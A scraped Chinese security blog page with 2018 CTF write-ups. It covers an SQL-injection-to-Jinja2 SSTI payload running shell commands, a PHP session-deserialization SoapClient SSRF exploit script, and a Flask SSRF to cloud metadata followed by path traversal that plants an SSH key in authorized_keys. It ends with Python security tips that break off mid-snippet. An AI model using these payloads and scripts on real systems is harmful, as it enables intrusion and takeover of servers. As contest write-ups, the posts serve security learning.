<p>参考文章：<br><a href="https://www.cnblogs.com/iceli/p/9564061.html" target="_blank" rel="noopener">https://www.cnblogs.com/iceli/p/9564061.html</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/sql注入-服务端模板注入（SSTI）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/21/sql注入-服务端模板注入（SSTI）/" itemprop="url">sql注入 & 服务端模板注入（SSTI）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-21T15:10:31+08:00">
                2018-11-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在2018山东省省赛出现的一个ctf题目：easy flask</p>
<p><img src="https://i.loli.net/2018/11/12/5be9368a4e22c.png" alt></p>
<p>可以看到该页面提供了两个功能，一个是add,另一个是searcha/。<br>而题目是easy flask,自然想到flask/jinja2的SSTI。<br>在add处输入payload尝试一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:boo</span><br><span class="line">comment:&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后search一下username,发现注入成功。<br><img src="https://i.loli.net/2018/11/12/5be93785b5e2b.png" alt></p>
<p>但是拿出payload深入测试时，却发现对username和commemnt的内容做了长度限制。</p>
<p>此处先放一放，继续测试下面的search功能。<br>发现存在sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1: &apos; union select 1,2,3 -- +</span><br></pre></td></tr></table></figure></p>
<p>那么便可以利用sql注入，将ssti的payload显示到页面上，从而达到模板注入的效果。</p>
<p>最终的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,&quot;</span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[59].__init__.func_globals.linecache.os.popen(&apos;cat /flag&apos;).read()&#125;&#125;&quot; -- -</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/session反序列化-soap-ssrf-crlf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/21/session反序列化-soap-ssrf-crlf/" itemprop="url">session反序列化+soap(ssrf+crlf)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-21T15:06:36+08:00">
                2018-11-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>出自LCTF2018一道web题：bestphp’s revenge</p>
<p>这道题目还是很有意思的，思路也很清奇。</p>
<p>首先题目给出源码<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后还扫到一个flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;*************************&#125;&apos;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&apos;flag&apos;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure></p>
<p>可以看到拿到flag的条件是绕过$_SERVER[“REMOTE_ADDR”]===”127.0.0.1”。<br>这里可以利用ssrf本地去访问flag.php<br>这里利用的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session反序列化-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类</span><br></pre></td></tr></table></figure></p>
<p>首先构造出session反序列化的条件:利用call_user_func()调用session_start()设置erialize_handler为php_serialize。<br>因为题目源码中没有可以利用的构造pop链的类，而刚好SOAP的SoapClient类可以用来创建soap数据报文，与wsdl接口进行交互的，达到ssrf的效果。<br>那么就可以构造soapClient的反序列化(具体参考<a href="https://www.anquanke.com/post/id/153065#h2-5[从几道CTF题看SOAP安全问题][1]、[https://xz.aliyun.com/t/2148][2]" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-5[从几道CTF题看SOAP安全问题][1]、[https://xz.aliyun.com/t/2148][2]</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;|O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
<p>最后需要再利用第二个call_user_func激活soap类，具体实施是通过变量覆盖利用extract将<strong>$b</strong>为call_user_func，调用<strong>$a</strong>中对象，从而触发soap的网络请求。这里数组a中<strong>$_SESSION</strong>里的数据是soap对象，再经过reset()弹出这个对象成为了$a[0]。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET = array(&apos;f&apos;=&gt;&apos;extract&apos;);</span><br><span class="line">$_POST = array(&apos;b&apos;=&gt;&apos;call_user_func&apos;);</span><br></pre></td></tr></table></figure></p>
<p>附一payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = &quot;http://172.81.210.82/&quot;</span><br><span class="line"></span><br><span class="line">payload = &apos;|O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&apos;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">data = &#123;&apos;serialize_handler&apos; : &apos;php_serialize&apos;&#125;</span><br><span class="line">url1 = url+&quot;?f=session_start&amp;name=&quot;+payload</span><br><span class="line">html = r.post(url1, data=data).text</span><br><span class="line"></span><br><span class="line">data = &#123;&apos;b&apos; : &quot;call_user_func&quot;&#125;</span><br><span class="line">url2 = url+&quot;?f=extract&amp;name=&quot;+payload</span><br><span class="line">html = r.post(url2, data=data).text</span><br><span class="line"></span><br><span class="line">data = &#123;&apos;b&apos; : &quot;var_dump&quot;&#125;</span><br><span class="line">url2 = url+&quot;?f=extract&amp;name=&quot;+payload</span><br><span class="line">html = r.post(url2, data=data).text</span><br><span class="line"></span><br><span class="line">rs = re.findall(r&apos;string\(26\) &quot;(.*?)&quot;&apos;, html)</span><br><span class="line"></span><br><span class="line">url2 = url</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;PHPSESSID=&quot;+rs[0]&#125;</span><br><span class="line">html = r.post(url2,headers = cookie).text</span><br><span class="line">print html</span><br></pre></td></tr></table></figure></p>
<p>  资料：<a href="https://xz.aliyun.com/t/3341#toc-23" target="_blank" rel="noopener">LCTF 2018 Writeup – Nu1L</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/python-ssrf-put上传ssh公钥/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/19/python-ssrf-put上传ssh公钥/" itemprop="url">python ssrf+put上传ssh公钥</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T13:28:07+08:00">
                2018-11-19
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python安全/" itemprop="url" rel="index">
                    <span itemprop="name">python安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>来源于lctf2018的一道web题：Travel</p>
<h2 id="0x01-题目源码"><a href="#0x01-题目源码" class="headerlink" title="0x01 题目源码"></a>0x01 题目源码</h2><p>首先题目给出源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&apos;/upload/&lt;filename&gt;&apos;, methods = [&apos;PUT&apos;])</span><br><span class="line">def upload_file(filename):</span><br><span class="line">    name = request.cookies.get(&apos;name&apos;)</span><br><span class="line">    pwd = request.cookies.get(&apos;pwd&apos;)</span><br><span class="line">    if name != &apos;lctf&apos; or pwd != str(uuid.getnode()):</span><br><span class="line">        return &quot;0&quot;</span><br><span class="line">    filename = urllib.unquote(filename)</span><br><span class="line">    with open(os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename), &apos;w&apos;) as f:</span><br><span class="line">        f.write(request.get_data(as_text = True))</span><br><span class="line">        return &quot;1&quot;</span><br><span class="line">    return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods = [&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    url = request.args.get(&apos;url&apos;, &apos;&apos;)</span><br><span class="line">    if url == &apos;&apos;:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line">    if &quot;http&quot; != url[: 4]:</span><br><span class="line">        return &quot;hacker&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url, timeout = 10)</span><br><span class="line">        response.encoding = &apos;utf-8&apos;</span><br><span class="line">        return response.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Something Error&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>可以看到只要<strong>name=’lctf’&amp;&amp;pwd=str(uuid.getnode())</strong>即可登陆成功上传任意文件。<br>而这里需要知道uuid.getnode()也就是网卡地址。正常的话可以读取/sys/class/net/eth0/address来获得。题目是Python + requests库。requests库的底层是urllib，而没有任何扩展的urllib仅支持http和https协议，因此我们没有办法读取任意文件。我们查一查IP，就能发现是腾讯云的机器。既然是云服务商，那么通常就会有一个metadata的API。例如，Amazon EC2，就可以通过 <a href="http://169.254.169.254" target="_blank" rel="noopener">http://169.254.169.254</a> 来获取metadata，而所有基于OpenStack搭建的云服务也都使用这个地址。</p>
<p>因此，让我们查看<a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">腾讯云的文档</a>，很容易就能搞出payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.150.86/?url=http://metadata.tencentyun.com/latest/meta-data/mac</span><br></pre></td></tr></table></figure></p>
<p>得到网卡地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52:54:00:48:c8:73（hex）-&gt;90520735500403(int)</span><br></pre></td></tr></table></figure></p>
<p>然后在put的时候会出现一个问题</p>
<p><img src="https://i.loli.net/2018/11/19/5bf2c77eda015.png" alt></p>
<p>会出现一个405 not allowed<br>而与POST出现的不太一样。<br><img src="https://i.loli.net/2018/11/19/5bf2c7ef6a5a2.png" alt></p>
<p>那么这里可以确认是Nginx层面上禁止了PUT。Flask对这个问题有解决方案，即X-HTTP-Method-Override头。<br><img src="https://i.loli.net/2018/11/19/5bf2c8afaa11a.png" alt></p>
<p>这里利用任意文件写+目录穿透上传ssh公钥。<br>在本地生成ssh公钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -P &apos;&apos;</span><br></pre></td></tr></table></figure></p>
<p>然后将公钥上传到目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/lctf/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>这里需要注意到是需要将目录进行两次url编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..%252f..%252f..%252f..%252f..%252f..%252fhome%252flctf%252f.ssh%252fauthorized_keys</span><br></pre></td></tr></table></figure></p>
<p>然后即可进行登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lctf@118.25.150.86</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/11/19/5bf2c9d069ee2.png" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/16/python-安全-tips/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/16/python-安全-tips/" itemprop="url">python安全tips</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-16T11:16:38+08:00">
                2018-11-16
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python安全/" itemprop="url" rel="index">
                    <span itemprop="name">python安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Input-function"><a href="#Input-function" class="headerlink" title="Input function"></a>Input function</h2><p>在python2中，通过input输入的内容将作为python代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python2</span><br><span class="line">  &gt;&gt;&gt; input()</span><br><span class="line">  dir()</span><br><span class="line">  [&apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__name__&apos;, &apos;__package__&apos;]</span><br><span class="line"> &gt;&gt;&gt; input()</span><br><span class="line"> __import__(&apos;sys&apos;).exit()</span><br><span class="line"> $</span><br></pre></td></tr></table></figure>
<p>安全的输入方式是使用raw_input()获取stdin内容，在python3中input已变得跟raw_input相等。</p>
<h2 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h2><p>在python中使用assert语句使用断言，例如使用断言以判断程序是否可以继续执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def verify_credentials(username, password):</span><br><span class="line">       assert username and password, &apos;Credentials not supplied by caller&apos;</span><br><span class="line"></span><br><span class="line">       ... authenticate possibly null user with null password ...</span><br></pre></td></tr></table></figure></p>
<p>这样使用并没有什么问题，但是当程序使用python -O 编译为优化的字节码时，会导致asser语句被忽略。</p>
<p>In Python 2.7, <strong>-O</strong> has the following effect:</p>
<ul>
<li>the byte code extension changes to <strong>.pyo</strong></li>
<li><strong>sys.flags.optimize</strong> gets set to 1</li>
<li><strong><strong>debug</strong></strong> is False</li>
<li><strong>assert</strong> don’t get executed</li>
</ul>
<h2 id="可重复使用整数"><a href="#可重复使用整数" class="headerlink" title="可重复使用整数"></a>可重复使用整数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 999+1 is 1000</span><br><span class="line">    False</span><br><span class="line">&gt;&gt;&gt; 1+1 is 2</span><br><span class="line">    True</span><br></pre></td></tr></table></figure>
<p>这两个结果看起来有点匪夷所思，但实际上是我们对is有错误的理解。is操作符是在两个对象的标识上工作的，并不能用于比较数值。在python中，万物皆对象，每个对象都有一个唯一标识，可以用id函数来读取。要找出两个变量或两个属性是否都指向同一个对象，可以使用is操作符。</p>
<h2 id="浮点数比较"><a href="#浮点数比较" class="headerlink" title="浮点数比较"></a>浮点数比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 2.2 * 3.0 == 3.3 * 2.0</span><br><span class="line">  False</span><br></pre></td></tr></table></figure>
<p>上面的结果是由于固有受限精度导致舍入错误:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; (2.2 * 3.0).hex()</span><br><span class="line">   &apos;0x1.a666666666667p+2&apos;</span><br><span class="line">   &gt;&gt;&gt; (3.3 * 2.0).hex()</span><br><span class="line">   &apos;0x1.a666666666666p+2&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="float-gt-无穷"><a href="#float-gt-无穷" class="headerlink" title="float &gt; 无穷"></a>float &gt; 无穷</h2><p>在python中，float类型支持无穷大的概念:float(‘infinity’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 10**1000000 &gt; float(&apos;infinity&apos;)</span><br><span class="line">   False</span><br></pre></td></tr></table></figure></p>
<p>因此我们有理由相信，一切都比无穷小,但是一不小心，又翻车了</p>
<p>任意type对象比无穷大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; float &gt; float(&apos;infinity&apos;)</span><br><span class="line">  True</span><br><span class="line">&gt;&gt;&gt; int &gt; float(&apos;infinity&apos;)</span><br><span class="line">  True</span><br></pre></td></tr></table></figure></p>
<p>这一车祸现场在python3中被处理，type()不能与float()进行比较。</p>
<h2 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h2><p>python不支持对象隐藏属性，但是其提供一种使用双下划线__开头的属性隐藏方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Foo:</span><br><span class="line">    __N=111111</span><br><span class="line">    N  =222222 </span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.__Name=name </span><br><span class="line"></span><br><span class="line">    def __f1(self):</span><br><span class="line">        print self.__Name</span><br><span class="line">    def f2(self):</span><br><span class="line">        self.__f1()</span><br><span class="line">    def get_private(self):</span><br><span class="line">   ...     return self.__N</span><br></pre></td></tr></table></figure>
<p>定义上面的class<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = Foo(&apos;boogle&apos;)</span><br><span class="line">&gt;&gt;&gt; f.N</span><br><span class="line">    222222</span><br><span class="line">&gt;&gt;&gt; f.__N</span><br><span class="line">    AttributeError: Foo instance has no attribute &apos;__N&apos;</span><br><span class="line">&gt;&gt;&gt; f.__f1()</span><br><span class="line">    AttributeError: Foo instance has no attribute &apos;__f1&apos;</span><br><span class="line">&gt;&gt;&gt; f.f2()</span><br><span class="line">    boogle</span><br></pre></td></tr></table></figure></p>
<p>从上面的测试来看，使用__开头貌似确实实现了隐藏，而且其也成功在 getattr()/hasattr()中隐藏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.has_private()</span><br><span class="line">    False</span><br></pre></td></tr></table></figure></p>
<p>但这种隐藏只是一种语法上的变形，并没有达到真正意义上的隐藏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;print  Foo.__dict__</span><br><span class="line">   &#123;&apos;__module__&apos;: &apos;__main__&apos;, &apos;_Foo__f1&apos;: &lt;function __f1 at 0x02D8D0B0&gt;, &apos;f2&apos;: &lt;function f2 at 0x02D8D070&gt;, &apos;N&apos;: 222222, &apos;_Foo__N&apos;: 111111, &apos;__doc__&apos;: None, &apos;__init__&apos;: &lt;function __init__ at 0x02D8D130&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>得到Foo类的所有属性跟函数。<br>那么有没有办法直接查看这些属性的内容呢？答案是肯定的,我们可以用下划线_加类名加属性名的方法查看其内容（注意类名前是单下划线）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f._Foo__N</span><br><span class="line">    111111</span><br><span class="line">&gt;&gt;&gt; f.__dict__</span><br><span class="line">    &#123;&apos;_Foo__Name&apos;: &apos;boogle&apos;&#125;</span><br></pre></td></tr></table></figure></p>
<p>另外当对属性进行重新赋值时，这些隐藏的属性也会被显示出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.__N = 333333</span><br><span class="line">&gt;&gt;&gt; f.__N</span><br><span class="line">    333333</span><br><span class="line">&gt;&gt;&gt; f.has_private()</span><br><span class="line">    True</span><br></pre></td></tr></table></figure>
<h2 id="模块注入"><a href="#模块注入" class="headerlink" title="模块注入"></a>模块注入</h2><p>python的模块导入为python注入了活力，其功能强大而复杂，例如通过 <figure class="highlight plain"><figcaption><span>os ```可以导入系统命令模块，从而执行系统系统命令。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python中模块和包可以通过定义在sys.path列表中的搜索路径找到的文件或目录名导入。搜索路径初始化是一个复杂的过程，它也依赖于Python版本，平台和本地配置。要想对其实施模块注入，就要知道其初始化的搜索路径，从来正确导入。</span><br><span class="line"></span><br><span class="line">我们可以运行下面的脚本知道其实际的搜索路径</span><br></pre></td></tr></table></figure></p>
<p>$ cat myapp.py</p>
<p>   #!/usr/bin/python</p>
<p>   import sys<br>   import pprint</p>
<p>   pprint.pprint(sys.path)</p>
